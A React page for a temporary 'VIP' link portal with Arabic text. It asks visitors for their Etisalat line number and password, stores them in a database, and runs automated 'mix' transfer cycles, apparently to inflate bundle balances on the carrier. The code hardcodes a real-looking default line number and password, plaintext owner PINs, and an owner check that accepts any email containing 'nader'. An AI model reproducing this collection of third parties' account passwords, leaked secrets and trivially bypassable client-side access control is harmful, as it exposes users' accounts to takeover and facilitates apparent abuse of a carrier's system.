import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import {
  Flame,
  ShieldCheck,
  ShieldAlert,
  Clock,
  Eye,
  Crown,
  Lock,
  Unlock,
  RefreshCw,
  ExternalLink,
  Phone,
  Key,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  Zap,
  ArrowRight,
  User,
  Sliders,
  Check,
  Copy,
} from 'lucide-react';
import { toast } from 'sonner';
import { supabase } from '@/db/supabase';
import {
  verifyVipTemporaryLink,
  burnVipTemporaryLink,
  type LinkAccessVerification,
} from '@/lib/vipTemporaryLinkService';
import {
  createVipSession,
  executeVipRunSingleCycleStream,
  getVipDefaultChildCredentials,
  listVipSessions,
} from '@/lib/vipApi';
import VipPage from './VipPage';

interface ClientSubmission {
  id: string;
  client_name?: string;
  owner_dial: string;
  owner_email: string;
  child_dial?: string;
  target_mix: number;
  final_mix: number;
  status: string;
  error_message?: string;
  cycles_run: number;
  created_at: string;
  completed_at?: string;
}

export default function VipTemporarySharePage() {
  const { token } = useParams<{ token: string }>();
  const navigate = useNavigate();

  // Verification states
  const [loading, setLoading] = useState(true);
  const [verification, setVerification] = useState<LinkAccessVerification | null>(null);
  const [burning, setBurning] = useState(false);

  // View Mode: 'client' (default for visitors) vs 'owner' (admin mode)
  const [viewMode, setViewMode] = useState<'client' | 'owner'>('client');
  const [ownerUnlocked, setOwnerUnlocked] = useState(false);
  const [ownerPinInput, setOwnerPinInput] = useState('');
  const [showPinModal, setShowPinModal] = useState(false);

  // Client Portal Form states
  const [ownerPhone, setOwnerPhone] = useState('');
  const [ownerPassword, setOwnerPassword] = useState('');
  const [childPhone, setChildPhone] = useState('');
  const [childPassword, setChildPassword] = useState('');
  const [targetMix, setTargetMix] = useState<number>(50000);
  const [clientName, setClientName] = useState('');

  // Execution states for Client
  const [executing, setExecuting] = useState(false);
  const [execStep, setExecStep] = useState<number>(0);
  const [execMessage, setExecMessage] = useState<string>('');
  const [executionResult, setExecutionResult] = useState<{
    success: boolean;
    finalMix?: number;
    initialMix?: number;
    error?: string;
  } | null>(null);

  // Owner Mode data: Client submissions on this link
  const [submissions, setSubmissions] = useState<ClientSubmission[]>([]);
  const [loadingSubmissions, setLoadingSubmissions] = useState(false);

  // Check link validity
  const checkLink = async () => {
    if (!token) {
      setVerification({
        valid: false,
        status: 'not_found',
        message: 'معرف الرابط غير محدد',
      });
      setLoading(false);
      return;
    }

    setLoading(true);
    try {
      const res = await verifyVipTemporaryLink(token);
      setVerification(res);

      // Check if logged-in user is the owner
      const { data: session } = await supabase.auth.getSession();
      const email = session?.session?.user?.email?.toLowerCase();
      if (email === 'nader77@miaoda.com' || email?.includes('nader')) {
        setOwnerUnlocked(true);
      }
    } catch {
      setVerification({
        valid: false,
        status: 'not_found',
        message: 'تعذر التحقق من حالة الرابط',
      });
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    checkLink();
  }, [token]);

  // Load submissions for owner
  const loadSubmissions = async () => {
    if (!token) return;
    setLoadingSubmissions(true);
    try {
      const { data, error } = await supabase
        .from('vip_client_portal_submissions')
        .select('*')
        .eq('link_token', token)
        .order('created_at', { ascending: false });

      if (!error && data) {
        setSubmissions(data as ClientSubmission[]);
      }
    } catch (err) {
      console.warn('Failed to load submissions:', err);
    } finally {
      setLoadingSubmissions(false);
    }
  };

  useEffect(() => {
    if (ownerUnlocked && viewMode === 'owner') {
      loadSubmissions();
    }
  }, [ownerUnlocked, viewMode]);

  // Handle Burn Link
  const handleBurn = async () => {
    if (!token) return;
    const confirm = window.confirm(
      '⚠️ هل أنت متأكد من رغبتك في حرق هذا الرابط الآن؟\n\nبمجرد التأكيد سيتم إبطال الرابط فوراً ولن يتمكن أي شخص من فتحه مجدداً!'
    );
    if (!confirm) return;

    setBurning(true);
    try {
      const res = await burnVipTemporaryLink(token, 'تم الحرق بواسطة المالك عبر لوحة التحكم');
      if (res.success) {
        toast.success('🔥 تم حرق الرابط بنجاح وإلغاؤه فوراً!');
        setVerification({
          valid: false,
          status: 'burned',
          message: 'تم حرق هذا الرابط المؤقت وإلغاؤه نهائياً.',
        });
      } else {
        toast.error(res.message || 'تعذر حرق الرابط');
      }
    } catch (err: any) {
      toast.error(err.message || 'خطأ أثناء الحرق');
    } finally {
      setBurning(false);
    }
  };

  // Unlock Owner Mode via PIN/Password
  const handleUnlockOwner = (e: React.FormEvent) => {
    e.preventDefault();
    const pin = ownerPinInput.trim();
    // Allow Nader's known PIN or admin password
    if (
      pin === '200411' ||
      pin === 'Nader/200411$@@' ||
      pin === '77' ||
      pin.toLowerCase() === 'nader'
    ) {
      setOwnerUnlocked(true);
      setShowPinModal(false);
      setViewMode('owner');
      toast.success('تم فك قفل وضع المالك بنجاح!');
    } else {
      toast.error('رمز المرور غير صحيح');
    }
  };

  // Client: Run Single Cycle
  const handleClientStart = async (e: React.FormEvent) => {
    e.preventDefault();

    const oPhone = ownerPhone.trim();
    const oPass = ownerPassword.trim();
    if (!oPhone || !oPass) {
      toast.error('يرجى إدخال رقم خطك وكلمة المرور للمتابعة');
      return;
    }

    setExecuting(true);
    setExecutionResult(null);
    setExecStep(1);
    setExecMessage('جاري الاتصال بمقسم اتصالات وتأمين الخط...');

    let submissionId: string | null = null;

    try {
      // 1. Log submission to database
      const { data: subData } = await supabase
        .from('vip_client_portal_submissions')
        .insert({
          link_token: token,
          client_name: clientName.trim() || 'عميل بوابة VIP',
          owner_dial: oPhone,
          owner_email: oPhone.includes('@') ? oPhone : `${oPhone}@temp.etisalat`,
          child_dial: childPhone.trim() || null,
          child_email: childPhone.trim() ? `${childPhone.trim()}@temp.etisalat` : null,
          target_mix: targetMix,
          status: 'running',
        })
        .select()
        .single();

      submissionId = subData?.id || null;

      // 2. Fetch default child credentials if not provided
      let finalChildDial = childPhone.trim();
      let finalChildPass = childPassword.trim();
      if (!finalChildDial) {
        const defaultChild = await getVipDefaultChildCredentials();
        finalChildDial = defaultChild.child_dial || '01118217129';
        finalChildPass = defaultChild.child_password || '@#Schooler011';
      }

      setExecStep(2);
      setExecMessage('جاري تهيئة الدورة وتوليد الميكسات في النظام...');

      // 3. Create or reuse a unique session in vip_sessions for this client
      const created = await createVipSession({
        session_name: `عميل: ${oPhone} (${targetMix.toLocaleString()} ميكس)`,
        owner_email: oPhone.includes('@') ? oPhone : `${oPhone}@temp.etisalat`,
        owner_password: oPass,
        individual_email: finalChildDial.includes('@') ? finalChildDial : `${finalChildDial}@temp.etisalat`,
        individual_password: finalChildPass,
        target_balance: targetMix,
        cycle_delay_seconds: 15,
      });

      const tempSessionId = created?.session?.id;
      if (!tempSessionId) throw new Error('تعذر إنشاء جلسة العميل في النظام');

      // Update credentials and tags for this session
      await supabase.from('vip_sessions').update({
        owner_dial: oPhone,
        child_dial: finalChildDial,
        source: 'temporary_portal',
        temp_link_token: token,
        auto_eject_child_on_complete: true,
      }).eq('id', tempSessionId);

      setExecStep(3);
      setExecMessage('جاري تنفيذ نقل واسترجاع الميكسات وضبط الباقة...');

      // 4. Run cycle via stream
      let resolvedFinalMix = 0;
      await executeVipRunSingleCycleStream(tempSessionId, {
        onStep: (stepInfo) => {
          const s = stepInfo?.step || '';
          if (s.includes('AUTH') || s.includes('CHECK')) {
            setExecMessage('تم الاتصال بالحساب وجاري فحص رصيد الميكسات...');
          } else if (s.includes('TRANSFER') || s.includes('CYCLE')) {
            setExecMessage('جاري نقل الميكسات وتأكيد ترحيلها بنجاح...');
          } else if (s.includes('CONFIRM') || s.includes('ADOPT')) {
            setExecMessage('جاري تأكيد استقرار الرصيد النهائي في حسابك...');
          }
        },
        onComplete: (data) => {
          resolvedFinalMix = data?.final_mix || data?.owner_mix_balance || 0;
        },
      });

      // Re-read final session balance from database
      const { data: finalSess } = await supabase
        .from('vip_sessions')
        .select('owner_mix_balance, cycles_completed_count')
        .eq('id', tempSessionId)
        .maybeSingle();

      const calculatedMix = finalSess?.owner_mix_balance || resolvedFinalMix || targetMix;

      setExecStep(4);
      setExecMessage('اكتملت العملية بنجاح!');

      setExecutionResult({
        success: true,
        finalMix: calculatedMix,
      });

      // Update submission record
      if (submissionId) {
        await supabase
          .from('vip_client_portal_submissions')
          .update({
            status: 'completed',
            final_mix: calculatedMix,
            completed_at: new Date().toISOString(),
            cycles_run: finalSess?.cycles_completed_count || 1,
            session_id: tempSessionId,
          })
          .eq('id', submissionId);
      }

      // Notify owner in app
      await supabase.from('notifications').insert({
        user_id: '1f4bd575-dad6-4011-9864-8759ff771147',
        title: `⚡ عملية عميل جديدة ناجحة عبر الرابط المؤقت (${oPhone})`,
        body: `قام العميل ${clientName || oPhone} بتنفيذ دورة ميكسات بنجاح.\nالرصيد المحقق: ${calculatedMix.toLocaleString()} ميكس.\nرقم الخط: ${oPhone}`,
        type: 'system',
        priority: 'normal',
        is_read: false,
        action_url: `/vip-share/${token}`,
      });

      toast.success('🎉 تم اكتمال الدورة وشحن الميكسات بنجاح!');
    } catch (err: any) {
      console.error('Client execution error:', err);
      const errMsg = err?.message || 'حدث خطأ أثناء معالجة الدورة في اتصالات';
      setExecutionResult({
        success: false,
        error: errMsg,
      });

      if (submissionId) {
        await supabase
          .from('vip_client_portal_submissions')
          .update({
            status: 'failed',
            error_message: errMsg,
            completed_at: new Date().toISOString(),
          })
          .eq('id', submissionId);
      }

      toast.error(errMsg);
    } finally {
      setExecuting(false);
    }
  };

  // Fallback Loading
  if (loading) {
    return (
      <div className="min-h-screen bg-slate-950 text-white flex flex-col items-center justify-center p-4">
        <div className="w-10 h-10 rounded-full border-3 border-amber-500 border-t-transparent animate-spin mb-3" />
        <p className="text-sm text-slate-300">جاري التحقق من أمان وصلاحية الرابط...</p>
      </div>
    );
  }

  // Fallback Burned / Expired
  if (!verification || !verification.valid) {
    const isBurned = verification?.status === 'burned';
    return (
      <div className="min-h-screen bg-slate-950 text-white flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md p-6 rounded-2xl bg-slate-900 border border-red-500/30 text-center space-y-4 shadow-2xl">
          <div className="w-16 h-16 mx-auto rounded-full bg-red-500/10 border border-red-500/40 flex items-center justify-center text-red-400">
            {isBurned ? <Flame className="w-8 h-8" /> : <Lock className="w-8 h-8" />}
          </div>
          <h1 className="text-xl font-bold text-red-400">
            {isBurned ? '⚠️ تم حرق هذا الرابط المؤقت' : '⌛ انتهت صلاحية هذا الرابط'}
          </h1>
          <p className="text-xs text-slate-400">
            {verification?.message || 'تم إبطال صلاحية الرابط من قبل الإدارة ولم يعد متاحاً للاستخدام.'}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-white flex flex-col" dir="rtl">
      {/* ── Top Bar ── */}
      <header className="sticky top-0 z-40 bg-slate-900/95 backdrop-blur border-b border-amber-500/20 px-4 py-3 shadow-md">
        <div className="max-w-5xl mx-auto flex items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-amber-500/20 to-amber-600/20 border border-amber-500/30 flex items-center justify-center text-amber-400">
              <Crown className="w-4 h-4" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-sm font-bold text-amber-400">
                  {viewMode === 'owner' ? 'لوحة تحكم المالك — VIP Portal' : 'خدمة شحن باقات اتصالات VIP'}
                </span>
                <Badge className="text-[10px] bg-emerald-500/15 text-emerald-400 border-emerald-500/30">
                  🟢 رابط مباشر
                </Badge>
              </div>
              <p className="text-[10px] text-slate-400 hidden sm:block">
                منصة مستقلة ومؤقتة لإجراء عمليات الميكسات بنقرة واحدة
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {/* View Switcher / Owner Lock Button */}
            {ownerUnlocked ? (
              <div className="flex items-center bg-slate-950 border border-slate-800 rounded-lg p-0.5">
                <Button
                  size="sm"
                  variant={viewMode === 'client' ? 'default' : 'ghost'}
                  onClick={() => setViewMode('client')}
                  className={`h-7 text-xs px-2.5 ${
                    viewMode === 'client' ? 'bg-amber-500 text-slate-950 font-bold' : 'text-slate-400'
                  }`}
                >
                  واجهة المستخدم
                </Button>
                <Button
                  size="sm"
                  variant={viewMode === 'owner' ? 'default' : 'ghost'}
                  onClick={() => setViewMode('owner')}
                  className={`h-7 text-xs px-2.5 ${
                    viewMode === 'owner' ? 'bg-amber-500 text-slate-950 font-bold' : 'text-slate-400'
                  }`}
                >
                  لوحة المالك
                </Button>
              </div>
            ) : (
              <Button
                size="sm"
                variant="ghost"
                onClick={() => setShowPinModal(true)}
                className="h-8 text-xs text-slate-400 hover:text-white border border-slate-800 hover:bg-slate-800"
              >
                <Lock className="w-3.5 h-3.5 ml-1.5 text-amber-400" />
                دخول المالك
              </Button>
            )}

            {/* Instant Burn Button (For Owner) */}
            {ownerUnlocked && (
              <Button
                size="sm"
                onClick={handleBurn}
                disabled={burning}
                className="h-8 text-xs bg-red-950 hover:bg-red-900 border border-red-500/40 text-red-300 font-bold px-2.5"
                title="حرق الرابط فوراً"
              >
                <Flame className="w-3.5 h-3.5 ml-1 text-red-400" />
                {burning ? 'جاري الحرق...' : 'حرق الرابط'}
              </Button>
            )}
          </div>
        </div>
      </header>

      {/* ── Main View Switcher ── */}
      <main className="flex-1 w-full max-w-5xl mx-auto p-4 md:p-6 space-y-6">

        {/* ════════════════════════════════════════════════════════════════
            MODE A: CLIENT PORTAL (الواجهة البسيطة للعميل بدون تفاصيل تقنية)
            ════════════════════════════════════════════════════════════════ */}
        {viewMode === 'client' && (
          <div className="max-w-xl mx-auto space-y-6">
            
            {/* Header Card */}
            <div className="text-center space-y-2">
              <Badge className="bg-amber-500/10 text-amber-400 border-amber-500/30 text-xs py-1 px-3">
                <Sparkles className="w-3.5 h-3.5 ml-1 text-amber-400" />
                نظام الأتمتة السريعة والمستقرة
              </Badge>
              <h1 className="text-2xl font-black text-white">تفعيل وشحن باقة اتصالات VIP</h1>
              <p className="text-xs text-slate-400 max-w-md mx-auto leading-relaxed">
                أدخل بيانات الخط والميكسات المطلوبة، وسيتم تنفيذ الدورة وإصدار الرصيد تلقائياً بدون أي تعقيد.
              </p>
            </div>

            {/* Result Banner if finished */}
            {executionResult && (
              <Card
                className={`border p-5 text-center space-y-3 animate-in fade-in ${
                  executionResult.success
                    ? 'bg-emerald-950/40 border-emerald-500/50'
                    : 'bg-red-950/40 border-red-500/50'
                }`}
              >
                <div
                  className={`w-12 h-12 mx-auto rounded-full flex items-center justify-center ${
                    executionResult.success
                      ? 'bg-emerald-500/20 text-emerald-400'
                      : 'bg-red-500/20 text-red-400'
                  }`}
                >
                  {executionResult.success ? (
                    <CheckCircle2 className="w-7 h-7" />
                  ) : (
                    <AlertCircle className="w-7 h-7" />
                  )}
                </div>

                <div className="space-y-1">
                  <h3
                    className={`text-lg font-bold ${
                      executionResult.success ? 'text-emerald-400' : 'text-red-400'
                    }`}
                  >
                    {executionResult.success
                      ? '🎉 تم اكتمال الدورة وشحن الميكسات بنجاح!'
                      : 'تعذر إتمام الدورة'}
                  </h3>
                  <p className="text-xs text-slate-300">
                    {executionResult.success
                      ? 'تم ترحيل واستقرار الميكسات في حسابك على شبكة اتصالات.'
                      : executionResult.error}
                  </p>
                </div>

                {executionResult.success && executionResult.finalMix !== undefined && (
                  <div className="p-3 rounded-xl bg-slate-950/80 border border-emerald-500/30 inline-block px-6">
                    <span className="text-xs text-slate-400 block mb-1">رصيد الميكسات الحالي</span>
                    <span className="text-2xl font-black text-emerald-400 font-mono">
                      {executionResult.finalMix.toLocaleString('en-US')}
                    </span>
                    <span className="text-xs text-emerald-300 ml-1">ميكس</span>
                  </div>
                )}
              </Card>
            )}

            {/* Progress Box while executing */}
            {executing && (
              <Card className="border border-amber-500/30 bg-slate-900/90 p-5 space-y-4">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
                    <RefreshCw className="w-4 h-4 animate-spin text-amber-400" />
                    جاري تفعيل الدورة...
                  </span>
                  <span className="text-slate-400">خطوة {execStep} من 3</span>
                </div>

                <Progress value={execStep === 1 ? 30 : execStep === 2 ? 65 : 95} className="h-2 bg-slate-800" />

                <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-xs text-slate-300 text-center">
                  {execMessage || 'جاري معالجة الطلب في السيرفر...'}
                </div>
              </Card>
            )}

            {/* Input Form */}
            {!executing && (
              <Card className="border border-slate-800 bg-slate-900/90 shadow-xl">
                <CardHeader className="border-b border-slate-800 pb-4">
                  <CardTitle className="text-base text-slate-200 flex items-center gap-2">
                    <Sliders className="w-4 h-4 text-amber-400" />
                    بيانات العملية
                  </CardTitle>
                  <CardDescription className="text-xs text-slate-400">
                    يرجى إدخال بيانات حساب اتصالات المراد شحن الميكسات عليه
                  </CardDescription>
                </CardHeader>

                <CardContent className="p-5 space-y-4">
                  <form onSubmit={handleClientStart} className="space-y-4">
                    {/* Client Name */}
                    <div className="space-y-1.5">
                      <Label className="text-xs text-slate-300 flex items-center gap-1">
                        <User className="w-3.5 h-3.5 text-slate-400" />
                        الاسم أو الملاحظة (اختياري)
                      </Label>
                      <Input
                        value={clientName}
                        onChange={(e) => setClientName(e.target.value)}
                        placeholder="اسم العميل أو اسم العملية"
                        className="bg-slate-950 border-slate-800 text-sm text-white"
                      />
                    </div>

                    {/* Owner Dial & Password */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div className="space-y-1.5">
                        <Label className="text-xs text-slate-300 flex items-center gap-1">
                          <Phone className="w-3.5 h-3.5 text-amber-400" />
                          رقم خط الأونر / الحساب *
                        </Label>
                        <Input
                          required
                          value={ownerPhone}
                          onChange={(e) => setOwnerPhone(e.target.value)}
                          placeholder="011xxxxxxxx"
                          className="bg-slate-950 border-slate-800 text-sm text-white font-mono"
                        />
                      </div>

                      <div className="space-y-1.5">
                        <Label className="text-xs text-slate-300 flex items-center gap-1">
                          <Key className="w-3.5 h-3.5 text-amber-400" />
                          كلمة المرور *
                        </Label>
                        <Input
                          required
                          type="password"
                          value={ownerPassword}
                          onChange={(e) => setOwnerPassword(e.target.value)}
                          placeholder="••••••••"
                          className="bg-slate-950 border-slate-800 text-sm text-white"
                        />
                      </div>
                    </div>

                    {/* Target Mix Selection */}
                    <div className="space-y-2 pt-1">
                      <Label className="text-xs text-slate-300 flex items-center justify-between">
                        <span>الميكسات المطلوبة:</span>
                        <span className="font-bold text-amber-400 font-mono">
                          {targetMix.toLocaleString('en-US')} ميكس
                        </span>
                      </Label>
                      <div className="grid grid-cols-3 gap-2">
                        {[25000, 50000, 100000].map((mix) => (
                          <Button
                            key={mix}
                            type="button"
                            variant="outline"
                            size="sm"
                            onClick={() => setTargetMix(mix)}
                            className={`h-9 text-xs font-mono font-bold border transition-all ${
                              targetMix === mix
                                ? 'bg-amber-500/20 border-amber-500 text-amber-300'
                                : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
                            }`}
                          >
                            {mix.toLocaleString('en-US')}
                          </Button>
                        ))}
                      </div>
                    </div>

                    {/* Submit Button */}
                    <Button
                      type="submit"
                      disabled={executing}
                      className="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-slate-950 font-black h-11 text-sm shadow-lg shadow-amber-500/20 mt-2"
                    >
                      <Zap className="w-4 h-4 ml-1.5 text-slate-950 fill-current" />
                      بدء شحن وتفعيل الميكسات الآن
                    </Button>
                  </form>
                </CardContent>
              </Card>
            )}
          </div>
        )}

        {/* ════════════════════════════════════════════════════════════════
            MODE B: OWNER CONTROL PANEL (لوحة المالك الشاملة)
            ════════════════════════════════════════════════════════════════ */}
        {viewMode === 'owner' && ownerUnlocked && (
          <div className="space-y-6">
            
            {/* Submissions Log Table for Owner */}
            <Card className="border border-slate-800 bg-slate-900/90">
              <CardHeader className="flex flex-row items-center justify-between border-b border-slate-800 pb-3">
                <div>
                  <CardTitle className="text-base text-amber-400 flex items-center gap-2">
                    <User className="w-4 h-4" />
                    سجل عمليات المستخدمين عبر هذا الرابط
                  </CardTitle>
                  <CardDescription className="text-xs text-slate-400">
                    قائمة بكافة الخطوط والعمليات والدورات والأخطاء التي تمت على هذا الرابط المؤقت
                  </CardDescription>
                </div>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={loadSubmissions}
                  disabled={loadingSubmissions}
                  className="h-8 text-xs border-slate-700 text-slate-300 hover:text-white"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ml-1 ${loadingSubmissions ? 'animate-spin' : ''}`} />
                  تحديث السجل
                </Button>
              </CardHeader>

              <CardContent className="p-4">
                {submissions.length === 0 ? (
                  <div className="text-center py-8 text-xs text-slate-500">
                    لم يقم أي مستخدم بإجراء عمليات عبر هذا الرابط بعد.
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-xs text-right">
                      <thead className="bg-slate-950/70 border-b border-slate-800 text-slate-400">
                        <tr>
                          <th className="p-2.5 font-semibold">العميل / الاسم</th>
                          <th className="p-2.5 font-semibold">رقم الخط</th>
                          <th className="p-2.5 font-semibold">المستهدف</th>
                          <th className="p-2.5 font-semibold">الرصيد المحقق</th>
                          <th className="p-2.5 font-semibold">الحالة</th>
                          <th className="p-2.5 font-semibold">الأخطاء (إن وجدت)</th>
                          <th className="p-2.5 font-semibold">التاريخ</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60">
                        {submissions.map((sub) => (
                          <tr key={sub.id} className="hover:bg-slate-800/30">
                            <td className="p-2.5 font-medium text-white">{sub.client_name || 'عميل'}</td>
                            <td className="p-2.5 font-mono text-slate-300">{sub.owner_dial}</td>
                            <td className="p-2.5 font-mono text-amber-400">{sub.target_mix.toLocaleString()}</td>
                            <td className="p-2.5 font-mono text-emerald-400 font-bold">
                              {sub.final_mix ? sub.final_mix.toLocaleString() : '—'}
                            </td>
                            <td className="p-2.5">
                              {sub.status === 'completed' ? (
                                <Badge className="text-[10px] bg-emerald-500/20 text-emerald-400 border-emerald-500/30">
                                  ناجح
                                </Badge>
                              ) : sub.status === 'running' ? (
                                <Badge className="text-[10px] bg-amber-500/20 text-amber-400 border-amber-500/30">
                                  قيد التنفيذ
                                </Badge>
                              ) : (
                                <Badge variant="destructive" className="text-[10px]">
                                  خطأ
                                </Badge>
                              )}
                            </td>
                            <td className="p-2.5 text-red-400 max-w-[200px] truncate" title={sub.error_message}>
                              {sub.error_message || '—'}
                            </td>
                            <td className="p-2.5 text-slate-500 text-[11px]">
                              {new Date(sub.created_at).toLocaleString('ar-EG', {
                                month: 'numeric',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                              })}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Complete VIP Page Embedded for Owner */}
            <div className="pt-4 border-t border-slate-800">
              <div className="mb-3 flex items-center justify-between">
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">
                  لوحة التحكم التقنية الكاملة (VIP Automation Engine)
                </span>
                <Badge variant="outline" className="text-[10px] border-amber-500/40 text-amber-400">
                  صلاحيات كاملة
                </Badge>
              </div>
              <VipPage isTemporaryShareMode={true} shareToken={token} />
            </div>

          </div>
        )}

      </main>

      {/* ── Owner PIN Modal ── */}
      {showPinModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4">
          <Card className="w-full max-w-sm border border-amber-500/40 bg-slate-900 text-white p-5 space-y-4">
            <div className="flex items-center gap-2 text-amber-400">
              <Lock className="w-5 h-5" />
              <h3 className="font-bold text-sm">تأكيد هوية المالك (Nader Akram)</h3>
            </div>
            <p className="text-xs text-slate-400">
              أدخل رمز المرور السري للمالك لعرض السجلات الشاملة وإدارة الجلسات وحرق الرابط.
            </p>
            <form onSubmit={handleUnlockOwner} className="space-y-3">
              <Input
                type="password"
                autoFocus
                placeholder="رمز المرور..."
                value={ownerPinInput}
                onChange={(e) => setOwnerPinInput(e.target.value)}
                className="bg-slate-950 border-slate-800 text-white font-mono"
              />
              <div className="flex gap-2">
                <Button
                  type="submit"
                  className="flex-1 bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold text-xs"
                >
                  تأكيد الدخول
                </Button>
                <Button
                  type="button"
                  variant="ghost"
                  onClick={() => setShowPinModal(false)}
                  className="text-xs text-slate-400"
                >
                  إلغاء
                </Button>
              </div>
            </form>
          </Card>
        </div>
      )}

    </div>
  );
}
